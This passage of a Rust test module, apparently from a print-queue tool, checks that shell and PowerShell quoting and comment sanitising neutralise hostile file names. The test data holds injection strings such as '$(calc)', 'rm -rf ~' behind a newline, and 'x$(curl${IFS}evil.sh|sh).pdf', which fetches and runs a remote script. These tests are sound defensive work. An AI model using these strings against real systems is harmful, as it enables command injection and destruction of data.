        for s in ["$env:USERNAME", "@args", "a,b", "`n", "%x%", "$(calc)"] {
            assert!(powershell_quote(s).starts_with('\''), "{s}");
        }
    }

    /// Inside a quoted PowerShell string, an odd run of single-quote characters
    /// is a delimiter. After quoting, every run inside the string is even, so
    /// nothing a file name holds can close it early.
    #[test]
    fn powershell_quote_never_leaves_an_unpaired_quote_inside() {
        let hostile = "x\u{2018}\u{2019}\u{201A}\u{201B}'$(calc)'\u{2019}; iex evil";
        let q = powershell_quote(hostile);
        let inner: Vec<char> = q.chars().collect();
        let inner = &inner[1..inner.len() - 1];
        let mut run = 0;
        for &c in inner.iter().chain(std::iter::once(&'x')) {
            if POWERSHELL_QUOTES.contains(&c) {
                run += 1;
            } else {
                assert_eq!(run % 2, 0, "unpaired quote in {q}");
                run = 0;
            }
        }
    }

    #[test]
    fn comment_text_cannot_break_out_of_a_comment_line() {
        assert_eq!(comment_text("a.pdf, b.png"), "a.pdf, b.png");
        assert_eq!(comment_text("a\nrm -rf ~\r.pdf"), "a?rm -rf ~?.pdf");
    }

    /// The preview a user pastes must not run what a hostile file name holds.
    #[test]
    fn preview_quotes_hostile_file_names() {
        let settings = JobSettings::default();
        let name = "x$(curl${IFS}evil.sh|sh).pdf";
        let cmd = preview_command(name, "Office", &settings, &PrinterCaps::unknown());
        if cfg!(windows) {
            assert!(cmd.contains("'x$(curl${IFS}evil.sh|sh).pdf'"), "{cmd}");
        } else {
            assert!(cmd.contains(" -t 'x$(curl${IFS}evil.sh|sh).pdf' "), "{cmd}");
            assert!(cmd.ends_with(" 'x$(curl${IFS}evil.sh|sh).pdf'"), "{cmd}");
        }
    }

    /// FR-041: whatever the user set for quality and tray has to be visible in
    /// the honesty panel — either as a real flag (CUPS) or as an explicit
    /// statement that it will not be applied (SumatraPDF).
    #[test]
    fn fr_041_preview_accounts_for_quality_and_tray() {
        use crate::queue::job::Quality;

        let settings = JobSettings {
            quality: Quality::High,
            tray: Some("Tray 2".to_string()),
            ..JobSettings::default()
        };
        let cmd = preview_command("job.pdf", "Office", &settings, &PrinterCaps::unknown());

        if cfg!(windows) {
            // No such printer, so no driver id for the tray: said, not sent.
            assert!(!cmd.contains("bin="), "{cmd}");
            assert!(cmd.contains("\"Tray 2\", so it is NOT applied"), "{cmd}");
            // Quality has no token: the panel says how it is carried instead.
            assert!(cmd.contains("\"high\""), "{cmd}");
        } else {
            // Multi-word values stay one argument when pasted into a shell.
            assert!(cmd.contains("'InputSlot=Tray 2'"), "{cmd}");
            assert!(cmd.contains("'media-source=Tray 2'"), "{cmd}");
            assert!(cmd.contains("print-quality=5"), "{cmd}");
            assert!(cmd.contains("cupsPrintQuality=High"), "{cmd}");
        }
    }
}
